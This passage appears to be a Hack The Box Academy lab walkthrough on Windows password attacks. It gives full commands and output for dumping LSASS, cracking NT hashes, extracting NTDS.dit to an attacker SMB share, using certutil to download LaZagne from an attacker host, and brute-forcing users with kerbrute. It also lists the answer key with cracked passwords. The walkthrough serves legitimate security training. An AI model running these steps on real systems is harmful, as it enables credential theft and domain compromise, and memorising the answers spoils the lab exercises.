SMB         10.129.181.195  445    FRONTDESK01      [+] Dumped 3 LSA secrets to /home/htb-ac-569447/.nxc/logs/FRONTDESK01_10.129.181.195_2025-06-05_050509.secrets and /home/htb-ac-569447/.nxc/logs/FRONTDESK01_10.129.181.195_2025-06-05_050509.cached
```

Students will be able to find an username and password in the output and will then submit it as the flag with the following format `username:password`

Answer: `frontdesk:Password123`

# Attacking LSASS

## Question 1

### “What is the name of the executable file associated with the Local Security Authority Process?“

By reading the section, students will understand that the executable file associated with the `Local Security Authority Process` is the `lsass.exe`.

![Password_Attacks_Walkthrough_Image_2.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_2.png)

Answer: `lsass.exe`

# Attacking LSASS

## Question 2

### “Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case sensitive)“

Students will start by spawning the target machine clicking `'Click here to spawn the target system!'`.

Once the target machine has finished booting, students will use `RDP` to get a session in the target machine with username `htb-student` and password `HTB_@cademy_stdnt!`.

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-eodlgmlq0q]─[~]
└──╼ [★]$ xfreerdp /v:10.129.202.149 /u:htb-student /p:HTB_@cademy_stdnt!

<SNIP>

The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Once the `RDP` session has been established, students will now open the `Task Manager` with Administrative privileges as seen below:

![Password_Attacks_Walkthrough_Image_3.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_3.png)

Students will then scroll down the list of processes until they find the `Local Security Authority Process` process, right click it and select the option `Create dump file`:

![Password_Attacks_Walkthrough_Image_4.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_4.png)

Students will receive a `The file has been successfully created.` message along with the path where the file is located `C:\Users\HTB-ST~1\AppData\Local\Temp\lsass.DMP`.

![Password_Attacks_Walkthrough_Image_5.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_5.png)

Once this is done, students will return to their attacking host and use `smbserver.py` with the `-smb2support` option, followed by the name of the share and the path where the `SMB` share is served from, in this case `/home/htb-ac-569447/Documents` but students will have to edit this accordingly.

Code: shell

```shell
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/htb-ac-569447/Documents
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-eodlgmlq0q]─[~]
└──╼ [★]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/htb-ac-569447/Documents
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
06/05/2025 07:41:00 AM: INFO: Config file parsed
```

Students will return to the `RDP` session and open the command prompt with administrative privileges.

![Password_Attacks_Walkthrough_Image_6.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_6.png)

Students will then `move` the `.DMP` file located at `C:\Users\HTB-ST~1\AppData\Local\Temp\lsass.DMP` to the newly created share, effectively transferring this file from the remote host to the attacker host.

Code: cmd

```cmd
move C:\Users\HTB-ST~1\AppData\Local\Temp\lsass.DMP \\PWNIP\CompData
```

```cmd-session
C:\Windows\system32>move C:\Users\HTB-ST~1\AppData\Local\Temp\lsass.DMP \\10.10.14.241\CompData

        1 file(s) moved.
```

Once this step is complete, students can close their `SMB` share by pressing `Ctrl + C` and confirm that the files were successfully transferred to the designated path used on the `smbserver.py` command, in this case `/home/htb-ac-569447/Documents`.

Code: shell

```shell
cd /home/htb-ac-569447/Documents; ls
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-eodlgmlq0q]─[~]
└──╼ [★]$ cd /home/htb-ac-569447/Documents; ls

lsass.DMP
```

Students will then use `pypykatz`

Code: shell

```shell
pypykatz lsa minidump ./lsass.DMP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-eodlgmlq0q]─[~/Documents]
└──╼ [★]$ pypykatz lsa minidump ./lsass.DMP

INFO:pypykatz:Parsing file ./lsass.DMP
FILE: ======== ./lsass.DMP =======
== LogonSession ==
authentication_id 338498 (52a42)
session_id 0
username htb-student
domainname FS01
logon_server FS01
logon_time 2025-06-05T12:31:03.441245+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1006
luid 338498

== LogonSession ==
authentication_id 126654 (1eebe)
session_id 0
username Vendor
domainname FS01
logon_server FS01
logon_time 2025-06-05T12:29:12.831856+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1003
luid 126654
	== MSV ==
		Username: Vendor
		Domain: FS01
		LM: NA
		NT: 31f87811133bc6aaa75a536e77f64314
		SHA1: 2b1c560c35923a8936263770a047764d0422caba
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [1eebe]==
		username Vendor
		domainname FS01
		password None
		password (hex)
	== Kerberos ==
		Username: Vendor
		Domain: FS01
	== WDIGEST [1eebe]==
		username Vendor
		domainname FS01
		password None
		password (hex)

<SNIP>
```

Students will be able to see the `NT` hash (`31f87811133bc6aaa75a536e77f64314`) for user `Vendor` on the output of `pypykatz`, which they will grab and crack with `hashcat`.

Code: shell

```shell
hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /usr/share/wordlists/rockyou.txt.gz
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-eodlgmlq0q]─[~/Documents]
└──╼ [★]$ hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /usr/share/wordlists/rockyou.txt.gz

hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]

<SNIP>

Dictionary cache building /usr/share/wordlists/rockyou.txt.gz: 33553434 bytes (6Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

31f87811133bc6aaa75a536e77f64314:{hidden}                  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 31f87811133bc6aaa75a536e77f64314
Time.Started.....: Thu Jun  5 07:56:43 2025 (0 secs)
Time.Estimated...: Thu Jun  5 07:56:43 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)

<SNIP>
```

Students will submit the plaintext password as the answer.

Answer: `Mic@123`

# Attacking Windows Credential Manager

## Question 1

### “What is the password mcharles uses for OneDrive?“

Students will start by spawning the target machine clicking `'Click here to spawn the target system!'`.

Once the target machine has finished booting, students will use `RDP` to get a session in the target machine with username `sadams` and password `totally2brow2harmon@`.

Code: shell

```shell
xfreerdp /v:STMIP /u:sadams /p:totally2brow2harmon@
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-eodlgmlq0q]─[~/Documents]
└──╼ [★]$ xfreerdp /v:10.129.167.156 /u:sadams /p:totally2brow2harmon@

<SNIP>

The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Once the `RDP` session has been established, students will open command prompt:

![Password_Attacks_Walkthrough_Image_7.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_7.png)

Following this, students will use `cmdkey /list` to enumerate the credentials stored in the current user's profile (`sadams`):

Code: cmd

```cmd
cmdkey /list
```

```cmd-session
C:\Users\sadams>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02hejubrtyqjrkfi
    Local machine persistence

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```

Students can see that user `SRV01\mcharles` domain credentials are stored in the profile with `Domain:interactive=SRV01\mcharles` as target which means that the credential can be used for interactive logon sessions, which students will use to impersonate `mcharles`.

For this, students will use `runas` with the `/savecred` option followed by the user `/user:SRV01\mcharles` and `cmd`.

Code: cmd

```cmd
runas /savecred /user:SRV01\mcharles cmd
```

```cmd-session
C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd

Attempting to start cmd as user "SRV01\mcharles" ...
```

![Password_Attacks_Walkthrough_Image_8.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_8.png)

A new command prompt will show up running as `SRV01\mcharles`. From here, students will use `cmdkey /list` once more to enumerate the credentials stored in the current user's profile (`mcharles`):

Code: cmd

```cmd
cmdkey /list
```

```cmd-session
C:\Windows\system32>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02jejfxhvabjneqt
    Local machine persistence

    Target: LegacyGeneric:target=onedrive.live.com
    Type: Generic
    User: mcharles@inlanefreight.local
    
```

![Password_Attacks_Walkthrough_Image_9.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_9.png)

From here, students will open a new terminal in their attack host, create a new directory called `www`, `cd` in this directory, and download [LaZagne](https://github.com/AlessandroZ/LaZagne):

Code: shell

```shell
mkdir www; cd www; wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe -O lazagne.exe
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-eodlgmlq0q]─[~/www/www]
└──╼ [★]$ mkdir www; cd www; wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe -O lazagne.exe
```

Students will then host a web server using `python3 -m http.server` module:

Code: shell

```shell
python3 -m http.server
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-eodlgmlq0q]─[~/www]
└──╼ [★]$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Students will now go back the `RDP` session on the remote host and using the command prompt running as `SRV01\mcharles` download the hosted `lazagne.exe` file with the `certutil` tool.

Code: cmd

```cmd
certutil -urlcache -split -f "http://PWNIP:8000/lazagne.exe" C:\Windows\Temp\lazagne.exe
```

```cmd-session
C:\Windows\system32>certutil -urlcache -split -f "http://10.10.14.241:8000/lazagne.exe" C:\Windows\Temp\lazagne.exe

****  Online  ****
  000000  ...
  9aaa1d
CertUtil: -URLCache command completed successfully.
```

Students can now run this tool and launching all its modules by using the `all` option.

Code: cmd

```cmd
C:\Windows\Temp\lazagne.exe all
```

```cmd-session
C:\Windows\system32>C:\Windows\Temp\lazagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: mcharles ##########

------------------- Credman passwords -----------------

[+] Password found !!!
URL: onedrive.live.com
Login: mcharles@inlanefreight.local
Password: {hidden}


[+] 1 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.6250052452087402
```

![Password_Attacks_Walkthrough_Image_10.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_10.png)

Answer: `Inlanefreight#2025`

# Attacking Active Directory and NTDS.dit

## Question 1

### “What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? (Format: \_\_\_\_.\_\_\*)“

By reading the section, students will understand that the name of the file stored on a domain controller that contains the password hashes of all domain accounts is the `NTDS.dit`.

![Password_Attacks_Walkthrough_Image_11.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_11.png)

Answer: `NTDS.dit`

# Attacking Active Directory and NTDS.dit

## Question 2

### “Submit the NT hash associated with the Administrator user from the example output in the section reading.“

Students will navigate to the output of the `netexec` command in the `A faster method: Using NetExec to capture NTDS.dit` section. On line 10 the NT hash of the Administrator will be visible in the following format `(uid:rid:lmhash:nthash:::)`.

![Password_Attacks_Walkthrough_Image_12.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_12.png)

Answer: `64f12cddaa88057e06a81b54e73b949b`

# Attacking Active Directory and NTDS.dit

## Question 3

### “On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)“

Students will start by using `git` to `clone` the `username-anarchy` tool in order to generate common username formats.

Code: shell

```shell
git clone https://github.com/urbanadventurer/username-anarchy
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-eodlgmlq0q]─[~]
└──╼ [★]$ git clone https://github.com/urbanadventurer/username-anarchy

Cloning into 'username-anarchy'...
remote: Enumerating objects: 448, done.
remote: Counting objects: 100% (62/62), done.
remote: Compressing objects: 100% (49/49), done.
remote: Total 448 (delta 29), reused 32 (delta 9), pack-reused 386 (from 1)
Receiving objects: 100% (448/448), 16.79 MiB | 27.03 MiB/s, done.
Resolving deltas: 100% (156/156), done.
```

Students will then use the `username-anarchy` tool to generate the list of common username formats and redirect the output to a file such as `usernames.txt` by doing:

Code: shell

```shell
./username-anarchy John Marston > usernames.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-eodlgmlq0q]─[~/username-anarchy]
└──╼ [★]$ ./username-anarchy John Marston > usernames.txt
```

Once the file with common username formats was generated, students can use `kerbrute` with the `userenum` command to enumerate valid domain usernames. First students will have to download [kerbrute](https://github.com/ropnop/kerbrute) as such:

Code: shell

```shell
wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-eodlgmlq0q]─[~/username-anarchy]
└──╼ [★]$ wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
```

Once the file is downloaded, students will use `chmod +x` on the downloaded file to grant execution permissions in order to be able to run it.

Code: shell

```shell
chmod +x ./kerbrute
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-eodlgmlq0q]─[~/username-anarchy]
└──╼ [★]$ chmod +x ./kerbrute
```

Before running `kerbrute` students will use `netexec` to get the domain name. This can be achieved by doing:

Code: shell

```shell
netexec smb STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-eodlgmlq0q]─[~]
└──╼ [★]$ netexec smb 10.129.202.85

SMB         10.129.202.85   445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
```

Knowing that the domain name is `ILF.local` students can now construct the command for `kerbrute`, with the following syntax: `kerbrute userenum -d [domain] --dc [dc_ip] [wordlist]`.

Code: shell

```shell
./kerbrute userenum -d ILF.local --dc STMIP usernames.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-eodlgmlq0q]─[~/username-anarchy]
└──╼ [★]$ ./kerbrute userenum -d ILF.local --dc 10.129.202.85 usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/05/25 - Ronnie Flathers @ropnop

2025/06/05 11:07:10 >  Using KDC(s):
2025/06/05 11:07:10 >  	10.129.202.85:88

2025/06/05 11:07:10 >  [+] VALID USERNAME:	 jmarston@ILF.local
2025/06/05 11:07:10 >  Done! Tested 14 usernames (1 valid) in 0.017 seconds
```

Students are able to enumerate the user `jmarston` as a valid domain user. Students will then use either `netexec` or `kerbrute` itself to brute force `jmarston` password using the command `bruteuser`.

Code: shell

```shell
./kerbrute bruteuser -d ILF.local --dc STMIP /usr/share/wordlists/fasttrack.txt jmarston
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-eodlgmlq0q]─[~/username-anarchy]
└──╼ [★]$ ./kerbrute bruteuser -d ILF.local --dc 10.129.202.85 /usr/share/wordlists/fasttrack.txt jmarston

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/05/25 - Ronnie Flathers @ropnop

2025/06/05 11:11:35 >  Using KDC(s):
2025/06/05 11:11:35 >  	10.129.202.85:88

2025/06/05 11:11:36 >  [+] VALID LOGIN:	 jmarston@ILF.local:{hidden}
2025/06/05 11:11:36 >  Done! Tested 113 logins (1 successes) in 0.988 seconds
```

`Kerbrute` will be able to brute force this password and students will submit it the the format `username:password`.

Answer: `jmarston:P@ssword!`

# Attacking Active Directory and NTDS.dit

## Question 4

### “Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive)“

Students will connect to the target using the Windows Remote Management service combined with the PowerShell Remoting Protocol to establish a PowerShell session with credentials found from `question 3`.

Code: shell

```shell
evil-winrm -i STMIP  -u jmarston -p 'P@ssword!'
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-8cfjgi43b0]─[~]
└──╼ [★]$ evil-winrm -i 10.129.202.85  -u jmarston -p 'P@ssword!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jmarston\Documents>
```

Once the session is established, students need to confirm if the user `jmarston` is either a `Local Administrator` or a `Domain Admin`, this can be done by using `net user jmarston` or `net localgroup`:

Code: shell

```shell
net user jmarston
```

```shell-session
*Evil-WinRM* PS C:\Users\jmarston\Documents> net user jmarston

User name                    jmarston
Full Name                    John Marston
Comment                      IT Directory
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/21/2022 1:07:42 PM
Password expires             Never
Password changeable          1/22/2022 1:07:42 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   6/5/2025 9:15:03 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Admins        *Domain Users
                             *Leadership
The command completed successfully.
```

Students can see that the user `jmarston` is a member of `Domain Admins`, which means that this user can locate and the `NTDS.dit` file.

Code: shell

```shell
vssadmin CREATE SHADOW /For=C:
```

```shell-session
*Evil-WinRM* PS C:\Users\jmarston\Documents> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {169146ab-1f7b-4fbf-b5e6-6d01f8c5983e}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

Next, students will copy the `NTDS.dit` file to their current working directory (`C:\Users\jmarston\Documents`):

Code: shell

```shell
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit .\NTDS.dit
```

```shell-session
*Evil-WinRM* PS C:\Users\jmarston\Documents> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit .\NTDS.dit

        1 file(s) copied.
```

Students will now have a copy of `NTDS.dit` in their current working directory. Since `NTDS.dit` is encrypted with a key stored in `SYSTEM`, in order to successfully extract the hashes, the students will also need to make a copy of this file.

Code: shell

```shell
cmd.exe /c reg.exe save hklm\SYSTEM .\SYSTEM
```

```shell-session
*Evil-WinRM* PS C:\Users\jmarston\Documents> cmd.exe /c reg.exe save hklm\SYSTEM .\SYSTEM
The operation completed successfully.
```

Students will now have a copy of both `NTDS.dit` and `SYSTEM` in their current working directory.

Students will open a terminal in their attack host and host a `SMB` server using Impacket's `smbserver.py` with the option `-smb2support` followed by the name of the share and the path where the root directory of the share will be, in this case `/home/htb-ac-XXXXXX/Documents`, but this will have do be edited accordingly.

Code: shell

```shell
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support NTDS /home/htb-ac-XXXXXX/Documents
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-eodlgmlq0q]─[~]
└──╼ [★]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support NTDS /home/htb-ac-569447/Documents

Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
06/05/2025 11:19:35 AM: INFO: Config file parsed
```

Students will then go back to the PowerShell `evil-winrm` session and `move` both files, `NTDS.dit` and `SYSTEM`

Code: shell

```shell
cmd.exe /c move .\NTDS.dit \\PWNIP\NTDS
cmd.exe /c move .\SYSTEM \\PWNIP\NTDS
```

```shell-session
*Evil-WinRM* PS C:\Users\jmarston\Documents> cmd.exe /c move .\NTDS.dit \\10.10.14.241\NTDS

        1 file(s) moved.

*Evil-WinRM* PS C:\Users\jmarston\Documents> cmd.exe /c move .\SYSTEM \\10.10.14.241\NTDS

        1 file(s) moved.
```

Once both files have been moved to the attack host, students will make use of `secretsdump` tool from Impacket to dump the hashes:

Code: shell

```shell
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-eodlgmlq0q]─[~/Documents]
└──╼ [★]$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 086ab260718494c3a503c47d430a92a4
[*] Reading and decrypting hashes from NTDS.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:8af61f67a96ac6fb352f192b1cfc6b56:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::

<SNIP>
```

Students will then grab the NT hash (`92fd67fd2f49d0e83744aa82363f021b`) of the user `jstapleton` and use `hashcat` to crack it:

Code: shell

```shell
sudo hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-eodlgmlq0q]─[~/Documents]
└──╼ [★]$ sudo hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt.gz
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]

<SNIP>

Dictionary cache building /usr/share/wordlists/rockyou.txt.gz: 33553434 bytes (6Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

92fd67fd2f49d0e83744aa82363f021b:{hidden}               
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 92fd67fd2f49d0e83744aa82363f021b
Time.Started.....: Thu Jun  5 11:28:52 2025 (0 secs)
Time.Estimated...: Thu Jun  5 11:28:52 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)

<SNIP>
```

Answer: `Winter2008`

# Credential Hunting in Windows

## Question 1

### “What password does Bob use to connect to the Switches via SSH? (Format: Case-Sensitive)“

Students will start by spawning the target machine clicking `'Click here to spawn the target system!'`.

Once the target machine has finished booting, students will use `RDP` to get a session in the target machine with username `Bob` and password `HTB_@cademy_stdnt!`.

Code: shell

```shell
xfreerdp /v:STMIP /u:Bob /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dhuuhfndu9]─[~]
└──╼ [★]$ xfreerdp /v:10.129.202.99 /u:Bob /p:HTB_@cademy_stdnt!

<SNIP>

The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will start by using the search bar native to Windows to search for `password`.

![Password_Attacks_Walkthrough_Image_13.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_13.png)

Opening this file, students will be able to retrieve the password that Bob uses to connect to the Switches via `SSH`.

![Password_Attacks_Walkthrough_Image_14.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_14.png)

Answer: `WellConnected123`

# Credential Hunting in Windows

## Question 2

### “What is the GitLab access code Bob uses? (Format: Case-Sensitive)“

Students will open command prompt and use `findstr` to look for files containing the word `gitlab`:

![Password_Attacks_Walkthrough_Image_15.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_15.png)

Code: cmd

```cmd
findstr /SIM /C:"gitlab" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

```cmd-session
C:\Users\bob>findstr /SIM /C:"gitlab" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

.vscode\extensions\gitlab.gitlab-workflow-3.40.2\.gitlab-ci.yml
.vscode\extensions\gitlab.gitlab-workflow-3.40.2\LICENSE.txt
AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache133936717767264633.txt
AppData\Roaming\Mozilla\Firefox\Profiles\n3jtvbsy.default-release\cert_override.txt
Desktop\WorkStuff\GitlabAccessCodeJustIncase.txt
```

The file with the filename `GitlabAccessCodeJustIncase.txt` will pop right out as this is exactly what the question asks students for. Students will then use `type` on this file and retrieve the answer:

Code: cmd

```cmd
type C:\Users\bob\Desktop\WorkStuff\GitlabAccessCodeJustIncase.txt
```

```cmd-session
C:\Users\bob>type C:\Users\bob\Desktop\WorkStuff\GitlabAccessCodeJustIncase.txt

Gitlab access code just in case I lose connectivity with our local Gitlab instance.
{hidden}
```

Answer: `3z1ePfGbjWPsTfCsZfjy`

# Credential Hunting in Windows

## Question 3

### “What credentials does Bob use with WinSCP to connect to the file server? (Format: username:password, Case-Sensitive)“

Students will start by downloading `LaZagne.exe` to the attack host:

Code: shell

```shell
wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe -O lazagne.exe
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dhuuhfndu9]─[~]
└──╼ [★]$ wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe -O lazagne.exe
```

Students will there stand up a web server by using `python3 -m http.server` module:

Code: shell

```shell
python3 -m http.server
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dhuuhfndu9]─[~]
└──╼ [★]$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Students will open command prompt and use `certutil` to download the `lazagne.exe` from the attack host:

![Password_Attacks_Walkthrough_Image_15.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_15.png)

Code: cmd

```cmd
certutil -urlcache -split -f "http://STMIP:8000/lazagne.exe" C:\Windows\Temp\lazagne.exe
```

```cmd-session
C:\Users\bob>certutil -urlcache -split -f "http://10.10.14.241:8000/lazagne.exe" C:\Windows\Temp\lazagne.exe

****  Online  ****
